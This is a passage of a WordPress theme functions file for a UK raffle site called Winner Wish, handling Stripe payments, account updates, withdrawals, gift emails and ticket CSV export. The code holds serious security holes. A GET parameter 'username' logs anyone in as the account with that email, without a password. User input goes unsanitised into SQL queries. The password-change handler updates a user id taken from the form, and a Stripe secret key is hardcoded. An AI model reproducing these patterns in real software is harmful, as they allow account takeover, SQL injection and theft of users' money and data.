    if(empty($api_error) && $customerid){  
         
        // Convert price to cents 
        $itemPriceCents = ($amount*100); 
         
        // Charge a credit or a debit card 
        try {  
            $charge = \Stripe\Charge::create(array( 
                'customer' => $customerid, 
                'amount'   => $itemPriceCents, 
                'currency' => 'GBP', 
                'description' => "Winner Wish Competition" 
            )); 
        }catch(Exception $e) {  
            $api_error = $e->getMessage();  
        } 
         
        if(empty($api_error) && $charge){ 
         
            // Retrieve charge details 
            $chargeJson = $charge->jsonSerialize(); 
         	//print_r($chargeJson);
            // Check whether the charge is successful 
            if($chargeJson['amount_refunded'] == 0 && empty($chargeJson['failure_code']) && $chargeJson['paid'] == 1 && $chargeJson['captured'] == 1){ 
                // Transaction details  
				if($chargeJson['status'] == 'succeeded')
					$status = 'paid';
				else
					$status = 'Pending';
                $transactionID = $chargeJson['balance_transaction']; 
                $paidAmount = $chargeJson['amount']; 
                $paidAmount = ($paidAmount/100); 
                $paidCurrency = $chargeJson['currency']; 
                $payment_status = $status; 
                 
                
                // Insert tansaction data into the database 
                $transaction = array(
					"trans_id"=> $transactionID,
					"currency"=>$paidCurrency,
					"price"=>$paidAmount,
					"payment_method"=>"cards",
					'user_id'=>$user,
					"payment_status"=>$payment_status,
					"order_id"=>0,
					"payment_type"=>'topup_balance'
				);
				
                $insert =$wpdb->insert('PQrlH_transactions',$transaction);
				
				/* Insert tansaction data into the database 
                $transaction = array(
					"trans_id"=> $transactionID,
					"currency"=>$paidCurrency,
					"price"=>$paidAmount,
					"payment_method"=>"cards",
					'user_id'=>$user,
					"payment_status"=>$payment_status,
					"order_id"=>$charity,
					"payment_type"=>'charity_fund'
				);
				
                $insert = $wpdb->insert('PQrlH_transactions',$transaction)*/
				
				//$insert = true;
                 
                // If the order is successful 
                if($payment_status == 'paid' && $insert){ 
					if($get_other_user_info->stripe_customer_id !="" ){

					$update = $wpdb->update('PQrlH_userDetails',array('stripe_customer_id'=>$customerid),array('id'=>$get_other_user_info->id));
						
					}else{
					
						$wpdb->insert('PQrlH_userDetails',array('stripe_customer_id'=>$customer->id,'user_id'=>$user,'street'=>'','username'=>""));
					
					}
					//send_mail($email);
                    $response['error'] = false; 
                    $response['message'] = 'Your Payment has been Successful!'; 
                }else{ 
                   $response['error'] = true; 
                    $response['message'] = "Your Payment has Failed!"; 
                } 
            }else{ 
                	$response['error'] = true; 
                    $response['message']= "Transaction has been failed!"; 
            } 
        }else{ 
            		$response['error'] = true; 
                    $response['message'] = "Charge creation failed! $api_error";  
        } 
    }else{  
       				$response['error'] = true; 
                    $response['message']= "Invalid card details! $api_error";  
    } 
	
	echo json_encode($response);
	wp_die();
	
	
	
}


function place_order_stripe($token,$email,$amount,$order_id,$user,$already){
	extract($_POST);
    $response = array();
    global $wpdb;
	
	
	$get_other_user_info = $wpdb->get_row("select * from PQrlH_userDetails where user_id=".$user); 
	
	
	
if($token!=""){	
// Set API key 
    \Stripe\Stripe::setApiKey('sk_test_51H4QdgGmT7c3r5SQbt2GrPhzrLa1WMp7my7B9YsBAS0biYPV5cwYuxuuto5DumbhzfuhTo3WKCBsRDW19tDZJKuY00Xrrsauzm');      
    // Add customer to stripe 
	
	if($get_other_user_info->stripe_customer_id == ""){
		try {  
			$customer = \Stripe\Customer::create(array( 
				'email' => $email, 
				'source'  => $token 
			)); 
		}catch(Exception $e) {  
			$api_error = $e->getMessage();  
		} 
		
		$customerid = $customer->id;
	}else{
	
		$customerid = $get_other_user_info->stripe_customer_id;
		$api_error = "";
		if($already == 'add_new'){
		
			\Stripe\Customer::update($customerid, [
				'source' => $token,
			]);
		}
	}
     
    if(empty($api_error) && $customerid){  
         
        // Convert price to cents 
        $itemPriceCents = ($amount*100); 
         
        // Charge a credit or a debit card 
        try {  
            $charge = \Stripe\Charge::create(array( 
                'customer' => $customerid, 
                'amount'   => $itemPriceCents, 
                'currency' => 'GBP', 
                'description' => "Winner Wish Competition" 
            )); 
        }catch(Exception $e) {  
            $api_error = $e->getMessage();  
        } 
         
        if(empty($api_error) && $charge){ 
         
            // Retrieve charge details 
            $chargeJson = $charge->jsonSerialize(); 
         	//print_r($chargeJson);
            // Check whether the charge is successful 
            if($chargeJson['amount_refunded'] == 0 && empty($chargeJson['failure_code']) && $chargeJson['paid'] == 1 && $chargeJson['captured'] == 1){ 
                // Transaction details  
				if($chargeJson['status'] == 'succeeded')
					$chargeJson['status'] = 'paid';
                $transactionID = $chargeJson['balance_transaction']; 
                $paidAmount = $chargeJson['amount']; 
                $paidAmount = ($paidAmount/100); 
                $paidCurrency = $chargeJson['currency']; 
                $payment_status = $chargeJson['status']; 
                 
                $charity = get_user_meta( $user, 'charity',true);
                // Insert tansaction data into the database 
                $transaction = array(
					"trans_id"=> $transactionID,
					"currency"=>$paidCurrency,
					"price"=>$paidAmount,
					'user_id'=>0,
					"payment_method"=>"cards",
					"payment_status"=>$payment_status,
					"order_id"=>$order_id,
					"payment_type"=>'order_purchase'
				);
				
                $insert =$wpdb->insert('PQrlH_transactions',$transaction);
				
				
				 $transaction = array(
					"trans_id"=> $transactionID,
					"currency"=>$paidCurrency,
					"price"=>(5*$paidAmount)/100,
					"payment_method"=>"cards",
					'user_id'=>$user,
					"payment_status"=>$payment_status,
					"order_id"=>$charity,
					"payment_type"=>'charity_fund'
				);
				
                $insert =$wpdb->insert('PQrlH_transactions',$transaction);
				
				//$insert = true;
                 
                // If the order is successful 
                if($payment_status == 'paid' && $insert){ 
					$wpdb->update('PQrlH_orders',array("status" => "paid"),array("ord_id"=>$order_id));
					if($get_other_user_info->stripe_customer_id !="" ){

					$update = $wpdb->update('PQrlH_userDetails',array('stripe_customer_id'=>$customerid),array('id'=>$get_other_user_info->id));
						
					}else{
					
						$wpdb->insert('PQrlH_userDetails',array('stripe_customer_id'=>$customer->id,'user_id'=>$user,'street'=>'','username'=>""));
					
					}
					send_mail($email);
                    $response['error'] = false; 
                    $response['message'] = 'Your Payment has been Successful!'; 
                }else{ 
                   $response['error'] = true; 
                    $response['message'] = "Your Payment has Failed!"; 
                } 
            }else{ 
                	$response['error'] = true; 
                    $response['message']= "Transaction has been failed!"; 
            } 
        }else{ 
            		$response['error'] = true; 
                    $response['message'] = "Charge creation failed! $api_error";  
        } 
    }else{  
       				$response['error'] = true; 
                    $response['message']= "Invalid card details! $api_error";  
    } 
}else{ 
    				$response['error'] = true; 
                    $response['message']= "Error on Order Creation Try later."; 
} 

	return $response;

}

add_action('admin_post_update_userdetails','update_userdetails');
function update_userdetails(){
	extract($_POST);
    global $wpdb;

	if($userid !=""){
		
		//$update = $wpdb->update('PQrlH_userDetails',array('username'=>$username,'street'=>$street),array('id'=>$user_detail_id));
		if($first_name != "")
			update_user_meta($userid, 'first_name',$first_name );
		if($surname != "")
			update_user_meta($userid, 'last_name',$surname );
		if($uk_address != "")
			update_user_meta($userid, 'uk_adress',$uk_address );
		if($tel_number != "")
			update_user_meta($userid, 'number_datanew2',$tel_number );
		if($postal_code != "")
			update_user_meta($userid, 'postal_code',$postal_code );
		$update = true;
		
		if($update){
			/// do redierction
			$_SESSION['update_status'] = "updated";
			$_SESSION['update_status_msg'] = "Info Updated successfully!";
			wp_redirect($return_url);
		}else{
			$_SESSION['update_status'] = "error";
			$_SESSION['update_status_msg'] = "Please Try Later...";
			wp_redirect($return_url);
		
		}
	
	}else{
		$data_user = array('user_id'=>$userid,'username'=>$username,'street'=>$street);
		$insert = $wpdb->insert('PQrlH_userDetails',$data_user);
		if($insert){
			/// do redierction
			//echo "inserted";
			$_SESSION['update_status'] = "updated";
			$_SESSION['update_status_msg'] = "Info Updated successfully!";
			wp_redirect($return_url);
		}else{
			$_SESSION['update_status'] = "error";
			$_SESSION['update_status_msg'] = "Please Try Later...";
			wp_redirect($return_url);
		
		}
	}
	
	
}

add_action('admin_post_charity_setting','charity_setting');
function charity_setting(){
	extract($_POST);
    global $wpdb;
	
	$user_details = wp_get_current_user();
	echo $return_url;
    $charity_category;
	$user_details = wp_get_current_user();
	$id = $user_details->ID;
		
	if( get_user_meta( $id, 'charity',true) == ""){
	
			add_user_meta( $id, 'charity', $charity_category ,true );
	
	}else{
	
			update_user_meta( $id, 'charity', $charity_category);

	}
	
	$_SESSION['message_charity'] = "updated";
	
	wp_redirect($return_url);
	exit;
}


add_action('admin_post_update_userpassword','update_userpassword');
function update_userpassword(){
	extract($_POST);
    global $wpdb;
	$pass =  wp_hash_password($new_pass);

	$user_details = wp_get_current_user();
	


	if( wp_check_password($current_password, $user_details->user_pass, $userid)){
		
		if($new_pass == $confirm_pass){
		    if($wpdb->update('PQrLH_users',array("user_pass"=>$pass),array('ID'=>$userid))){
				$_SESSION['update_status'] = "updated";
				$_SESSION['update_status_msg'] = "Password updated!";
				wp_redirect($return_url,303);
				exit;
			}else{
				$_SESSION['update_status'] = "error";
				$_SESSION['update_status_msg'] = "Please Try later...";
				wp_redirect($return_url,303);
				exit;
			}
		}else{
			
			$_SESSION['update_status'] = "error";
			$_SESSION['update_status_msg'] = "New password && Confirm password not the same!";
			wp_redirect($return_url,303);
			exit;
		
		}
		
	}else{
	
			$_SESSION['update_status'] = "error";
			$_SESSION['update_status_msg'] = "Old Password not correct. Please check it.";
			wp_redirect($return_url,303);
		exit;
	}
	

	//wp_set_password( string $password, int $user_id )
	
}

function generateRandomString($length) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


/// Mail on Purchase

function send_mail($useremail){
$to = $useremail;
$subject = "Winnerwish Lottery Purchased";

$message = "
<html>
<head>
<title>Winner Wish</title>
</head>
<body>
<p> <b> Hi there!</b> </p>
<p> You have successfully! purchased lottery and tickets assigned to you can check in th user panel</p>
<p> In case any issue of query feel free to contact us <a href='<?php echo site_url();?>'>Winner Wish</a> </p>
<p> Thanks </p>
<p> Team Winnerwish </p>
</body>
</html>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: Winnerwish.com' . "\r\n";

mail($to,$subject,$message,$headers);

}

function my_payment_form_submit() {
 global $wpdb;
	 $amount=$_POST['amount'];
	$email= $_POST['email'];
	$gateway=$_POST['gatewaymethod'];
	$myuserid=$_POST['myuserid'];
	
	   $transaction = array(
					"amount"=> $amount,
					"email"=>$email,
					"paymentgateway"=>$gateway,
		           "status"=>"Pending",
		           "u_id"=>$myuserid,
				);
				
                $insert =$wpdb->insert('payment',$transaction);
	if($insert)
	{
			$_SESSION['update_status'] = "updated";
			$_SESSION['update_status_msg'] = "Payment Inserted!";
		wp_redirect("echo site_url();?page_id=1919");
		exit;
	}else
	{
			$_SESSION['update_status'] = "error";
			$_SESSION['update_status_msg'] = "SOMETHING WENT WRONG";
		wp_redirect(site_url()."?page_id=1919");
		exit;
	}
   
	wp_die();

	}
add_action( 'admin_post_my_simple_form', 'my_payment_form_submit' );


function change_payment_status() {
 	 global $wpdb;
 	 $paymentid=$_POST['qid'];
	 $amount = '-'.$_POST['withdraw_amount'];
	$userid = $_POST['userid'];
	$payment_method = $_POST['payment_method'];
	//echo "INSERT INTO PQrlH_transactions(trans_id,user_id,currency,price,payment_method,payment_status,order_id,payment_type) 		VALUES('Txn_withdraw',$userid,'USD',$amount,'$payment_method','paid',0,'withdraw_amount')";
	//die;
	$paymentdata = $wpdb->get_row("SELECT * FROM `payment` where id='$paymentid'");
	
	if($paymentdata->status=="Pending"){
		   $transaction = array(
					 "status"=>"Approved",
				);
		
		$update = $wpdb->update('payment',$transaction,array('id'=>$paymentid));
		
		if($update){
			$insert = $wpdb->query("INSERT INTO PQrlH_transactions(trans_id,user_id,currency,price,payment_method,payment_status,order_id,payment_type) 		VALUES('Txn_withdraw',$userid,'GBP',$amount,'$payment_method','paid',0,'withdraw_amount')");
			if($insert){
				 wp_redirect(site_url()."/wp-admin/admin.php?page=withdrawal",303);
				 exit;
			}else{
				echo "Error in transaction ";
			}
			
		}else{
			//echo  "error";
			wp_redirect(site_url()."/wp-admin/admin.php?page=withdrawal",303);
			exit;
		}
		
		
	}else{
	wp_redirect(site_url()."/wp-admin/admin.php?page=withdrawal",303);
	}
	
   
	//wp_die();

	}
add_action( 'admin_post_change_payment_status', 'change_payment_status' );



add_action( 'admin_menu', 'withdrawal_menu' );
function withdrawal_menu(){
	 add_menu_page("Withdrawal","Withdrawal","administrator","withdrawal","withdrawal_page",'dashicons-money-alt',10);
	}

function withdrawal_page(){
		require_once('templates/withdrawal_admin.php');
	}


function my_check_email() {

 $recipientemail=$_POST['recipientemail'];
$recipientmessage=$_POST['recipientmessage'];
$send=paymentsend_mail($recipientemail,$recipientmessage);		
   
	if($send)
	{
		wp_redirect(site_url()."/wp-admin/admin.php?page=withdrawal");
		exit;
	}else
	{
		wp_redirect(site_url()."/wp-admin/admin.php?page=withdrawal");
		exit;
	}
   
	wp_die();

	}
add_action( 'admin_post_check_email', 'my_check_email' );

function paymentsend_mail($useremail,$message){
$to = $useremail;
$subject = "Payment Email Check";

$message = "
<html>
<head>
<title>Winner Wish</title>
</head>
<body>
<p> <b> Hi there!</b> </p>
<p>$message</p>
<p> In case any issue of query feel free to contact us <a href='<?php echo site_url();?>'>Winner Wish</a> </p>
<p> Thanks </p>
<p> Team Winnerwish </p>
</body>
</html>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: Winnerwish.com' . "\r\n";

mail($to,$subject,$message,$headers);

}


function gift_mail($email,$gifttype,$amount,$raffle){
$to = $email;
$raffname= get_the_title($raffle);
$subject = "Congrats You Got a GIFT";
if($gifttype == 'balance' ){
$mess = "You got an gift of balance (£ ".$amount.") from Winnerswish.";
}else{
$mess = "You got an gift of Tickets on Raffle(".$raffname.") from Winnerswish.";
}
$message = "
<html>
<head>
<title>Winner Wish</title>
</head>
<body>
<p> <b> Hi there!</b> We have a great News for you! </p>
<p>$mess</p>
<p> In case any issue of query feel free to contact us <a href='<?php echo site_url();?>'>Winner Wish</a> </p>
<p> Thanks </p>
<p> Team Winnerwish </p>
</body>
</html>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: Winnerwish.com' . "\r\n";

mail($to,$subject,$message,$headers);

}

add_action( 'admin_menu', 'charity_fund' );
function charity_fund(){
	 add_menu_page("Charity Fund","Charity Fund","administrator","fund_charity","charity_page",'dashicons-money-alt',20);
	add_submenu_page( 
          null            // -> Set to null - will hide menu link
        , 'Charity Transaction'    // -> Page Title
        , 'Charity Transaction'    // -> Title that would otherwise appear in the menu
        , 'administrator' // -> Capability level
        , 'charity_trans'   // -> Still accessible via admin.php?page=menu_handle
        , 'add_transaction_charity' // -> To render the page
    );
	}

function charity_page(){
		require_once('templates/charity_fund.php');
	}
function add_transaction_charity(){
		require_once('templates/charity_transactions.php');
	}

function dynamic_dropdown_files( $field ){
	$args = array(  
        'post_type' => 'raffles',
        'post_status' => 'publish',
        'posts_per_page' => -1, 
        'order' => 'ASC', 
    );

    $loop = new WP_Query( $args ); 
	 if($loop->have_posts()) {
		 
		while ( $loop->have_posts() ){ 
			 $loop->the_post();
			$values[get_the_ID()] = get_the_title(get_the_ID());
		}
	   }
	$something_dynamic = $values;
    $field['choices'] = $something_dynamic;

    return $field;
}

add_filter('acf/load_field/name=competitions', 'dynamic_dropdown_files');


require_once ('winnerwish_apis.php');
$winnerWish_APIs = new WinnerWish();

if(is_user_logged_in()){

	$userID = get_current_user_id();
	if($user = get_userdata( $userID)){
		global $wpdb;
		if($user->auth == ''){
			$auth = generateRandomString(8);
			$wpdb->update('PQrLH_users',array('auth'=>$auth."_".$userID),array('ID'=>$userID));
		}
	}
}



function themeprefix_admin_print_scripts() {
	
	$screen 	= get_current_screen();
	$mod_arr 	= array( 'post' );
	
  ?>
	
	<script>
		( function( $ ) {
			acf.add_filter( 'date_picker_args', function( args ) {
				args['minDate'] = 0;
				return args;
			} );
		} )( jQuery );
	</script>
	
  <?php
	
}
add_action( 'acf/input/admin_footer', 'themeprefix_admin_print_scripts' );

add_action('init','showpassindicator');

function showpassindicator()
{
	add_shortcode('password','show_error_pass');
} 


function show_error_pass($atts,$content='')
{
	//return "HELLO, WORLD";
	
	$content.="<p class='password_show' style='display:none;color:red'>Password must be at least 8 characters</p>";
	return $content;
}

add_filter( 'wp_nav_menu_objects', 'my_dynamic_menu_items' );
function my_dynamic_menu_items( $menu_items ) {
    foreach ( $menu_items as $menu_item ) {
        if ( strpos($menu_item->title, '#profile_name#') !== false) {
                $menu_item->title =  str_replace("#profile_name#",  wp_get_current_user()->user_nicename, $menu_item->title);
        }
    }

    return $menu_items;
} 

if ( isset($_GET['action'] ) && $_GET['action'] == 'export' && $_GET['raffle'] != 'raffle' ){
	
		// Query
	 	$raffle = $_GET['raffle'];
		$statement = $wpdb->get_results("SELECT * FROM `PQrlH_order_details` where lottery_id=$raffle");
	     $sold = count($statement);
		 $get_total = get_post_meta($raffle,'total_entries',true);
		
		if($sold < $get_total){
		  	 $diff = $get_total-$sold;
			
			$query = "INSERT INTO PQrlH_order_details (`order_id`,`ticket`,`lottery_id`,`security_question`) values";
			for($i = 1 ; $i <= $diff;$i++){	
				$ticket = "WW-".generateRandomString(4);
				$query .="(0,'$ticket',$raffle,'not_assigned'),";
			}
			$query = trim($query,',');
				if($wpdb->query($query)){
					$statement = $wpdb->get_results("SELECT * FROM `PQrlH_order_details` where lottery_id=$raffle ");
				}
		 }
		$headers = ["Ticket Name", "Status"];
		// file creation
		$wp_filename = "Tickets-file.csv";

		// Clean object
		ob_end_clean ();

		// Open file
		$wp_file = fopen($wp_filename,"w");
		fputcsv($wp_file, $headers);
		// loop for insert data into CSV file
		foreach ($statement as $statementFet)
		{
			if($statementFet->security_question == 'true'){
				$status = "Right";
			}else if($statementFet->security_question == 'false'){
				$status = "Wrong";
			}else{
				$status = "NA";
			}
			$wp_array = array(
				"ticket"=>$statementFet->ticket,
				"status"=>$status
			);
			fputcsv($wp_file,$wp_array);
		}

		// Close file
		fclose($wp_file);

		// download csv file
		header("Content-Description: File Transfer");
		header("Content-Disposition: attachment; filename=".$wp_filename);
		header("Content-Type: application/csv;");
		readfile($wp_filename);
		exit;
}


function new_modify_user_table( $column ) {
	$column['website'] = "Website";
    $column['gifts'] = 'Send Gift';
	$column['tickets'] = 'View All Tickets';
    return $column;
}
add_filter( 'manage_users_columns', 'new_modify_user_table' );

function new_modify_user_table_row( $val, $column_name, $user_id ) {
    switch ($column_name) {
		case 'website' :
			if(get_user_meta($user_id,'sign_type',true) == '' || get_user_meta($user_id,'sign_type',true)=='Winner-wish'){
				return "<p style='color:green'><b>Winners Wish</b></p>";
			}else{
				return "<p style='color:blue'><b>".get_user_meta($user_id,'sign_type',true)."</b></p>";
			}
		break;
        case 'gifts' :
            return "<a href='?page=user_gifts&UID=".$user_id."' style='color: white;background: #1CD6CD;border: 1px solid #1CD6CD;padding: 6px 28px;'>Send Gifts</a>";
	    break;
		case 'tickets' :
            return "<a href='?page=user_tickets&UID=".$user_id."' style='color: white;background: #03a9f4;border: 1px solid #03a9f4;padding: 6px 28px;'>All Tickets</a>";
	    break;
    }
    return $val;
}
add_filter( 'manage_users_custom_column', 'new_modify_user_table_row', 10, 3 );


add_action( 'admin_menu', 'user_gifts_submenu' );
function user_gifts_submenu(){
	
	add_submenu_page( 
          null            // -> Set to null - will hide menu link
        , 'User Gifts'    // -> Page Title
        , 'User Gifts'    // -> Title that would otherwise appear in the menu
        , 'administrator' // -> Capability level
        , 'user_gifts'   // -> Still accessible via admin.php?page=menu_handle
        , 'user_gifts' // -> To render the page
    );
}

add_action( 'admin_menu', 'user_tickets_submenu' );
function user_tickets_submenu(){
	
	add_submenu_page( 
          null            // -> Set to null - will hide menu link
        , 'User Tickets'    // -> Page Title
        , 'User Tickets'    // -> Title that would otherwise appear in the menu
        , 'administrator' // -> Capability level
        , 'user_tickets'   // -> Still accessible via admin.php?page=menu_handle
        , 'user_tickets' // -> To render the page
    );
}


function user_tickets(){
		require_once('templates/user_tickets.php');
}

 
if( isset($_GET['username'])) {
    $user = get_user_by('email', $_GET['username']);
    if ( $user ) {
        wp_set_current_user($user->ID, $user->user_login);
        wp_set_auth_cookie($user->ID);
        do_action('wp_login', $user->user_login,$user);

        wp_redirect( home_url('/cart-page') );
        exit;
    }

    wp_redirect( home_url() );
    exit;
}


function wpdocs_theme_slug_widgets_init() {
    
      global $oxy_theme;
    $oxy_theme->register_sidebar( 'Footer middle', 'Middle footer section', '', 'footer-middle');
}
add_action( 'widgets_init', 'wpdocs_theme_slug_widgets_init' );


/***********************************customize**************************/


function mycustomize($wp_customize){
    $wp_customize->add_panel('mypanel',array(
         'title'=>'Logo',
         'description'=>'Change Logo',
         'priority'=>10,
        ));
        
    $wp_customize->add_section('mypanelsection',array(
         'title'=>'Logo',
         'description'=>'Change Logo',
         'panel'=>'mypanel',
         'priority'=>10,
        ));
        
    
    $wp_customize->add_setting('mypanelsetting',array(
         'default'=>"#000",
         'transport'=>"refresh",
        ));
        
    
    	$wp_customize->add_control( new WP_Customize_Media_Control( $wp_customize, 'mytheme_bg_image', array(
	'label'      => __( 'Logo', 'mytheme' ),
	'section'    => 'mypanelsection',
	'settings'   => 'mypanelsetting',
	'mine_type' =>'image',
) ) ); 
    
   
}

add_action('customize_register','mycustomize',10,1);
/********************end customize*************************************/


/***********************adding extra field***************************/

function pippin_taxonomy_add_new_meta_field() {
	// this will add the custom meta field to the add new term page
	?>
	<div class="form-field">
		<label for="term_meta[custom_term_meta]">Select Website Name</label>
     <select name="term_meta[custom_term_meta]">
         <option value="WINNER WISH">Winners Wish</option>
         <option value="WINNER KID">Winners Kid</option>
     </select>
		<!--<input type="text" name="term_meta[custom_term_meta]" id="term_meta[custom_term_meta]" value="">-->
		<p class="description">Select Website</p>
	</div>
<?php
}

add_action('raffle-category_add_form_fields', 'pippin_taxonomy_add_new_meta_field', 10, 2 );

function pippin_taxonomy_edit_meta_field($term) {
 
	// put the term ID into a variable
	$t_id = $term->term_id;
 
	// retrieve the existing value(s) for this meta field. This returns an array
	$term_meta = get_option( "taxonomy_$t_id" );
	
	  $dataresult=esc_attr( $term_meta['custom_term_meta'] ) ? esc_attr( $term_meta['custom_term_meta'] ) : '';
	?>
	
	<tr class="form-field">
	<th scope="row" valign="top"><label for="term_meta[custom_term_meta]">Select Website Name</label></th>
		<td>
		    <select name="term_meta[custom_term_meta]">
                 <option <?php if($dataresult=="WINNER WISH"){ echo "selected";} ?> value="WINNER WISH">Winners Wish</option>
                 <option <?php if($dataresult=="WINNER KID"){ echo "selected";} ?> value="WINNER KID">Winners Kid</option>
             </select>
         
			<!--<input type="text" name="term_meta[custom_term_meta]" id="term_meta[custom_term_meta]" value="<?php echo esc_attr( $term_meta['custom_term_meta'] ) ? esc_attr( $term_meta['custom_term_meta'] ) : ''; ?>">-->
			<p class="description">Select Website Name</p>
		</td>
	</tr>
<?php
}
add_action( 'raffle-category_edit_form_fields', 'pippin_taxonomy_edit_meta_field', 10, 2 );


function save_taxonomy_custom_meta( $term_id ) {
	if ( isset( $_POST['term_meta'] ) ) {
		$t_id = $term_id;
		$term_meta = get_option( "taxonomy_$t_id" );
		$cat_keys = array_keys( $_POST['term_meta'] );
		foreach ( $cat_keys as $key ) {
			if ( isset ( $_POST['term_meta'][$key] ) ) {
				$term_meta[$key] = $_POST['term_meta'][$key];
			}
		}
		// Save the option array.
		update_option( "taxonomy_$t_id", $term_meta );
	}
}  
add_action( 'edited_raffle-category', 'save_taxonomy_custom_meta', 10, 2 );  
add_action( 'create_raffle-category', 'save_taxonomy_custom_meta', 10, 2 );
/***********************end adding extra field***************************/
